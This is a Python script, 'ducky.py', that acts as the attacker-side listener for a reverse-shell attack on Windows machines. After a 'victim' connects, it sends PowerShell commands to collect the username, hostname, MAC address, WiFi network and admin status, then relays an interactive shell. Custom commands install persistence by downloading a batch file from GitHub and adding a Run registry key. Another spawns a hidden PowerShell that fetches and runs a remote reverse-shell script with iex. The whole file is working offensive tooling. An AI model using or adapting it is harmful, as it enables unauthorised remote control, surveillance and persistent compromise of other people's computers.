#!/usr/bin/python3
# ducky.py
# Ashish D'Souza
# October 8th, 2018
import socket
import threading
import os
import sys

port = 8008 if len(sys.argv) == 1 else int(sys.argv[1])
timeout = False
stop = False


def recv(conn):
    while not stop:
        print(conn.recv(1024).decode(), end="")
    print()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
if timeout:
    s.settimeout(31)
s.bind(("", port))
s.listen(5)
print("[-] Connecting to victim...")
conn, addr = s.accept()
if timeout:
    s.settimeout(None)
print("[+] Connected to victim (" + str(addr[0]) + ":" + str(addr[1]) + ")")
print("[+] Reverse shell attack successful!")
print("[+] Retrieved victim information:")
conn.send("$env:USERNAME\n".encode())
username = conn.recv(1024).decode().split("\n")[0]
print("Username:              " + username)
conn.send("$env:COMPUTERNAME\n".encode())
hostname = conn.recv(1024).decode().split("\n")[0]
print("Hostname:              " + hostname)
ip = str(addr[0])
print("IP Address:            " + ip)
port = str(addr[1])
print("Port:                  " + port)
conn.send("getmac | findstr Device | foreach-object{$_.split(\" \")[0]}\n".encode())
mac = conn.recv(1024).decode().split("\n")[0]
print("MAC Address:           " + mac)
conn.send("netsh wlan show network | findstr SSID | foreach-object{$_.split(\" \")[3]}\n".encode())
network = conn.recv(1024).decode().split("\n")[0]
print("Network:               " + network)
conn.send("$pid\n".encode())
pid = conn.recv(1024).decode().split("\n")[0]
print("Powershell PID:        " + pid)
conn.send("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")\n".encode())
elevation = conn.recv(1024).decode().split("\n")[0]
print("Elevated Powershell:   " + elevation)
conn.send("$env:OS\n".encode())
operating_system = conn.recv(1024).decode()
print("Operating System:      " + operating_system, end="")
operating_system = operating_system.split("\n")[0]
threading.Thread(target=recv, args=(conn,)).start()
while not stop:
    stdin = input()
    if pid in stdin:
        choice = input("[!] Are you sure you want to kill this Powershell process? Y/N\n")
        if choice.lower()[0] != "y":
            stdin = ""
            print("[-] Aborted.")
    if stdin.lower()[:6] == "ducky/":
        ducky_command = stdin[6:]
        if ducky_command[:4] == "help":
            print("Custom Ducky Commands\n")
            print("Usage: ducky/[command] [options]\n")
            print("Command              Options     Description")
            print("ducky/help           N/A         Show this help screen")
            print("ducky/clear          N/A         Clear the terminal screen")
            print("ducky/quit           -s          Leave a signature before exiting")
            print("                     -p          Permanently exit, kill the Powershell process")
            print("ducky/info           -a          Show all")
            print("                     -u          Show username")
            print("                     -h          Show hostname")
            print("                     -ip         Show IP address")
            print("                     -port       Show port")
            print("                     -m          Show MAC address")
            print("                     -n          Show network name")
            print("                     -pid        Show Powershell PID")
            print("                     -e          Show Powershell elevation status")
            print("                     -os         Show operating system")
            print("ducky/persistence    N/A         Set up a persistent shell")
            print("                     -d          Delete the persistent shell")
            print("ducky/reverse_shell  \"ip:port\"   Set up a custom reverse shell")
            stdin = ""
        elif ducky_command[:4] == "quit":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            commands = []
            if "-s" in options:
                commands.append("signature")
            if "-p" in options:
                commands.append("exit")
            stdin = "; ".join(commands)
            stop = True
        elif ducky_command[:5] == "clear":
            if sys.platform == "linux" or sys.platform == "linux2":
                os.system("clear")
            elif sys.platform == "win32":
                os.system("cls")
            else:
                print("ERROR: Operating system not compatible, unable to clear screen.")
            stdin = ""
        elif ducky_command[:4] == "info":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            if "-u" in options or "-a" in options:
                print("Username:               " + username)
            if "-h" in options or "-a" in options:
                print("Hostname:               " + hostname)
            if "-ip" in options or "-a" in options:
                print("IP Address:             " + ip)
            if "-port" in options or "-a" in options:
                print("Port:                   " + port)
            if "-m" in options or "-a" in options:
                print("MAC Address:            " + mac)
            if "-n" in options or "-a" in options:
                print("Network:                " + network)
            if "-pid" in options or "-a" in options:
                print("Powershell PID:         " + pid)
            if "-e" in options or "-a" in options:
                print("Elevated Powershell:    " + elevation)
            if "-os" in options or "-a" in options:
                print("Operating System:       " + operating_system)
            stdin = ""
        elif ducky_command[:11] == "persistence":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            commands = []
            if "-d" in options:
                commands.append("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /f")
                commands.append("rm $env:userprofile/Documents/persistence.bat")
            else:
                commands.append("df \"https://raw.githubusercontent.com/computer-geek64/ducky/master/persistence.bat\" \"$env:userprofile\\Documents\\persistence.bat\"")
                commands.append("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /d \"$env:userprofile\\Documents\\persistence.bat\" /t REG_SZ")
            stdin = "; ".join(commands)
        elif ducky_command[:13] == "reverse_shell":
            options = [x for x in ducky_command.split(" ")[1:] if x]
            attacker_ip = options[0].split(":")[0]
            attacker_port = options[0].split(":")[1]
            commands = []
            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + attacker_ip + "\\\"; $port=" + attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell).content\'")
            stdin = "; ".join(commands)
            print(stdin)
        else:
            print("Ducky command not recognized: \"" + ducky_command + "\"")
            stdin = ""
    conn.send((stdin + "\n").encode())
s.close()
